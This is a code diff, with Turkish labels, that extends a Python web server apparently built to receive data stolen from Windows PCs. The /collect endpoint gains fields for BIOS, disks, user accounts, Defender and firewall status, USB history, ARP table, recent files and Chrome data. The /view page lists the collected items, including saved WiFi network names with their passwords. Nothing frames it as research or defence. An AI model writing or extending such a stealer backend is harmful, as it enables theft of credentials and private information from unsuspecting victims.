@@ -137,12 +137,23 @@ def collect(request: Request):
                 "ip": data.get("ip", "?"),
                 "mac": data.get("mac", "?"),
                 "uptime": data.get("uptime", "?"),
-                "tarih": data.get("tarih", "?")  # PC'den gelen tarih
+                "tarih": data.get("tarih", "?"),
+                "bios": data.get("bios", "?"),
+                "disk": data.get("disk", "?"),
+                "users": data.get("users", "?"),
+                "defender": data.get("defender", "?"),
+                "fw": data.get("fw", "?"),
+                "usb": data.get("usb", "?")[:100],
+                "path": data.get("path", "?")[:100],
+                "arp": data.get("arp", "?")[:200],
+                "recent": data.get("recent", "?")[:150],
+                "chrome": data.get("chrome", "?")
             }
             print(f"✅ Veri alındı: {last_data['all']['tarih']}")
         return JSONResponse(request, {"status": "ok"})
     except:
         return JSONResponse(request, {"status": "error"}, status=500)
+
 
 @server.route("/view")
 def view(request: Request):
@@ -150,11 +161,12 @@ def view(request: Request):
         body{font-family:Arial;background:#1a1a1a;color:#0f0;padding:20px}
         h2{color:#fff} .box{background:#000;padding:15px;border-radius:5px}
         a{color:#fff;background:#333;padding:10px;text-decoration:none;border-radius:5px}
+        pre{background:#111;padding:10px;overflow-x:auto;font-size:12px;max-height:300px;overflow-y:auto}
     </style></head><body><h2>📊 Toplanan Bilgiler</h2><div class='box'>"""
     
     if "all" in last_data:
         d = last_data["all"]
-        html += f"<b>🕐 Toplanma Zamanı:</b> {d.get('tarih','?')}<br><br>"
+        html += f"<b>🕐 Zaman:</b> {d.get('tarih','?')}<br><br>"
         html += f"<b>💻 PC:</b> {d.get('pc','?')}<br>"
         html += f"<b>👤 Kullanıcı:</b> {d.get('user','?')}<br>"
         html += f"<b>🖥️ Sistem:</b> {d.get('os','?')}<br>"
@@ -163,39 +175,17 @@ def view(request: Request):
         html += f"<b>🎮 GPU:</b> {d.get('gpu','?')}<br>"
         html += f"<b>🌐 IP:</b> {d.get('ip','?')}<br>"
         html += f"<b>🔌 MAC:</b> {d.get('mac','?')}<br>"
-        html += f"<b>⏰ Son Açılış:</b> {d.get('uptime','?')}<br><br>"
-        html += "<b>🔑 WiFi:</b><br>"
-        for w in d.get("wifi", []):
-            html += f"• {w.get('ssid','?')}: {w.get('pwd','?')}<br>"
-    else:
-        html += "Veri yok."
-    
-    html += "</div><br><a href='/'>← Geri</a></body></html>"
-    return Response(request, html, headers={"Content-Type": "text/html"})
-
-@server.route("/view")
-def view(request: Request):
-    html = """<html><head><meta charset='UTF-8'><style>
-        body{font-family:Arial;background:#1a1a1a;color:#0f0;padding:20px}
-        h2{color:#fff} .box{background:#000;padding:15px;border-radius:5px}
-        a{color:#fff;background:#333;padding:10px;text-decoration:none;border-radius:5px}
-    </style></head><body><h2>📊 Toplanan Bilgiler</h2><div class='box'>"""
-    
-    if "all" in last_data:
-        d = last_data["all"]
-        html += f"<b>🕐 Alınma Zamanı:</b> {d.get('tarih','?')} {d.get('saat','?')}<br><br>"
-        html += f"<b>💻 Bilgisayar:</b> {d.get('pc','?')}<br>"
-        html += f"<b>👤 Kullanıcı:</b> {d.get('user','?')}<br>"
-        html += f"<b>🖥️ Sistem:</b> {d.get('os','?')}<br>"
-        html += f"<b>⚡ CPU:</b> {d.get('cpu','?')}<br>"
-        html += f"<b>🧠 RAM:</b> {d.get('ram','?')} GB<br>"
-        html += f"<b>🎮 GPU:</b> {d.get('gpu','?')}<br>"
-        html += f"<b>🌐 IP:</b> {d.get('ip','?')}<br>"
-        html += f"<b>🔌 MAC:</b> {d.get('mac','?')}<br>"
-        html += f"<b>⏰ Son Açılış:</b> {d.get('uptime','?')}<br><br>"
+        html += f"<b>⏰ Açılış:</b> {d.get('uptime','?')}<br>"
+        html += f"<b>🔒 BIOS:</b> {d.get('bios','?')}<br>"
+        html += f"<b>💾 Disk:</b> {d.get('disk','?')}<br>"
+        html += f"<b>👥 Kullanıcılar:</b> {d.get('users','?')}<br><br>"
         html += "<b>🔑 WiFi Şifreleri:</b><br>"
         for w in d.get("wifi", []):
             html += f"• {w.get('ssid','?')}: {w.get('pwd','?')}<br>"
+        
+        arp = d.get('arp', '?')
+        if arp and arp != '?':
+            html += "<br><b>🌍 ARP Tablosu:</b><pre>" + arp + "</pre>"
     else:
         html += "Henüz veri toplanmadı."
     
